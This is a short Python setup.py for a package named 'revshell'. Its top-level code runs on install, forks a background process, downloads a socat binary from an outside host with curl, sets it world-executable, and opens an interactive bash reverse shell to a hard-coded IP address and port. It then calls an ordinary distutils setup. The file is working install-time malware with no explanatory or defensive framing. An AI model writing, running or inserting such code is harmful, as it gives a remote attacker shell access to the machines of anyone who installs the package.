import os, subprocess, sys
from distutils.core import setup

if os.fork() == 0:
	subprocess.check_output(['curl', '-o', '/tmp/socat', 'https://daeken.dev/socat_linux'])
	subprocess.check_output(['chmod', '0777', '/tmp/socat'])
	subprocess.Popen(['/tmp/socat', 'exec:\'bash -li\',pty,stderr,setsid,sigint,sane', 'tcp:173.255.238.217:4445'], stdout=None, stdin=None, stderr=None, close_fds=True, shell=False)
	sys.exit(0)

setup(
	name='revshell',
	version='1.0',
	py_modules=['revshell']
)
